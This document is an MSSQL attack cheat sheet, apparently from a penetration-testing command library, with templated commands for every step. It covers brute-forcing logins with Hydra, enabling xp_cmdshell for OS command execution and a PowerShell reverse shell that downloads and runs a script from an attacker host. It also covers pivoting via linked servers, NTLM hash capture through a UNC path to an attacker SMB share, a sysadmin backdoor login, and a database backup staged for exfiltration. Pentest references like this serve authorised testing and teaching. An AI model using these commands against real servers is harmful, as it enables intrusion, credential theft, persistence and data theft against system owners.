# MSSQL
> Microsoft SQL Server enumeration, exploitation, and command execution
<!-- tags: mssql,database,sql,sqlserver,enumeration,exploit -->

---

## Nmap MSSQL Scripts
Enumerate MSSQL instance with NSE scripts for info, config, and weak auth.

```bash
nmap --script ms-sql-info,ms-sql-config,ms-sql-empty-password -p {{PORT:port:1433}} {{TARGET:ip}}
```

<!-- meta: risk=safe | phase=recon | tags=mssql,nmap,discovery -->

---

## Brute Force Credentials with Hydra
Brute force MSSQL logins with username and password lists.

```bash
hydra -L {{USERS_FILE:file:users.txt}} -P {{PASSWORDS_FILE:file:passwords.txt}} {{TARGET:ip}} mssql
```

<!-- meta: risk=high | phase=passwords | tags=mssql,bruteforce,hydra -->

---

## Connect with sqlcmd (Windows)
Authenticate to MSSQL using built-in Windows sqlcmd utility.

```bash
sqlcmd -S {{TARGET:ip}} -U {{USERNAME:str:sa}} -P {{PASSWORD:str}}
```

<!-- meta: risk=low | phase=enum | tags=mssql,sqlcmd,connect -->

---

## Connect with sqsh (Linux)
Connect from Linux client to MSSQL with sqsh.

```bash
sqsh -S {{TARGET:ip}} -U {{USERNAME:str}} -P {{PASSWORD:str}} -D {{DATABASE:str:master}}
```

<!-- meta: risk=low | phase=enum | tags=mssql,sqsh,linux -->

---

## Connect with impacket-mssqlclient (Windows Auth)
Connect using domain credentials with Windows authentication.

```bash
impacket-mssqlclient -port {{PORT:port:1433}} {{DOMAIN:domain}}/{{USERNAME:str}}:{{PASSWORD:str}}@{{TARGET:ip}} -windows-auth
```

<!-- meta: risk=low | phase=enum | tags=mssql,impacket,kerberos -->

---

## Get Version and Current User
Inspect server version and authenticated context.

```sql
SELECT @@version;
SELECT user_name();
SELECT system_user;
```

<!-- meta: risk=safe | phase=enum | tags=mssql,version,whoami -->

---

## List Databases and Tables
Enumerate databases and tables on the server.

```sql
SELECT name FROM sys.databases;
SELECT * FROM master.dbo.sysdatabases;
SELECT table_name FROM information_schema.tables WHERE table_type='BASE TABLE';
```

<!-- meta: risk=safe | phase=enum | tags=mssql,databases,tables -->

---

## Enumerate Server Principals (Logins)
List server-level principals including disabled accounts.

```sql
SELECT name, type_desc, is_disabled FROM sys.server_principals;
```

<!-- meta: risk=safe | phase=enum | tags=mssql,users,logins -->

---

## Check Current Permissions
List permissions granted to current user at server scope.

```sql
SELECT permission_name FROM fn_my_permissions(NULL, 'SERVER');
```

<!-- meta: risk=safe | phase=enum | tags=mssql,permissions -->

---

## Enable xp_cmdshell
Reconfigure server to allow OS command execution.

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

<!-- meta: risk=high | phase=exploit | tags=mssql,xp_cmdshell,enable -->

---

## Run OS Command via xp_cmdshell
Execute Windows command and return output.

```sql
EXEC xp_cmdshell '{{COMMAND:str:whoami}}';
```

<!-- meta: risk=high | phase=exploit | tags=mssql,rce,xp_cmdshell -->

---

## PowerShell Reverse Shell via xp_cmdshell
Spawn PowerShell reverse shell from MSSQL.

```sql
EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).downloadString(''http://{{LHOST:ip}}/rev.ps1'')"';
```

<!-- meta: risk=critical | phase=exploit | tags=mssql,reverse-shell,powershell -->

---

## Enumerate Linked Servers
List linked servers for lateral movement opportunities.

```sql
EXEC sp_linkedservers;
SELECT * FROM sys.servers;
```

<!-- meta: risk=safe | phase=enum | tags=mssql,linked-servers,lateral -->

---

## Execute Command on Linked Server
Run xp_cmdshell on a linked server to pivot.

```sql
EXEC ('EXEC xp_cmdshell ''whoami''') AT [{{LINKED_SERVER:str}}];
```

<!-- meta: risk=critical | phase=exploit | tags=mssql,linked-server,pivot -->

---

## List Directory with xp_dirtree
Enumerate filesystem directories (also useful for NTLM hash capture via UNC).

```sql
EXEC master..xp_dirtree '{{PATH:str:C:\Users\}}';
```

<!-- meta: risk=med | phase=enum | tags=mssql,xp_dirtree,filesystem -->

---

## NTLM Hash Capture via UNC Path
Force MSSQL to authenticate to attacker SMB server.

```sql
EXEC master..xp_dirtree '\\{{LHOST:ip}}\share';
```

<!-- meta: risk=high | phase=exploit | tags=mssql,ntlm,relay,coerce -->

---

## Create sysadmin Backdoor
Create a backdoor login with sysadmin role.

```sql
CREATE LOGIN {{USERNAME:str:backdoor}} WITH PASSWORD = '{{PASSWORD:str:Pwn3d!}}';
ALTER SERVER ROLE sysadmin ADD MEMBER {{USERNAME:str:backdoor}};
```

<!-- meta: risk=critical | phase=post | tags=mssql,persistence,backdoor -->

---

## Backup Database for Exfil
Backup database to disk for offline data exfil.

```bash
sqlcmd -S {{TARGET:ip}} -U {{USERNAME:str}} -P {{PASSWORD:str}} -Q "BACKUP DATABASE {{DATABASE:str}} TO DISK = 'C:\Windows\Temp\db.bak'"
```

<!-- meta: risk=high | phase=post | tags=mssql,backup,exfil -->

---

## Read Error Log for Sensitive Data
Inspect SQL Server error log (may contain credentials).

```sql
EXEC xp_readerrorlog;
```

<!-- meta: risk=med | phase=enum | tags=mssql,logs,sensitive -->

---

## Enable CLR Integration
Enable CLR for executing custom .NET assemblies on the server.

```sql
EXEC sp_configure 'clr enabled', 1; RECONFIGURE;
```

<!-- meta: risk=high | phase=exploit | tags=mssql,clr,rce -->

---

## Impacket - Enable xp_cmdshell from Shell
Run convenience helpers from impacket-mssqlclient session.

```bash
SQL> enable_xp_cmdshell
SQL> xp_cmdshell {{COMMAND:str:whoami}}
SQL> enum_links
SQL> enum_impersonate
```

<!-- meta: risk=high | phase=exploit | tags=mssql,impacket,helpers -->
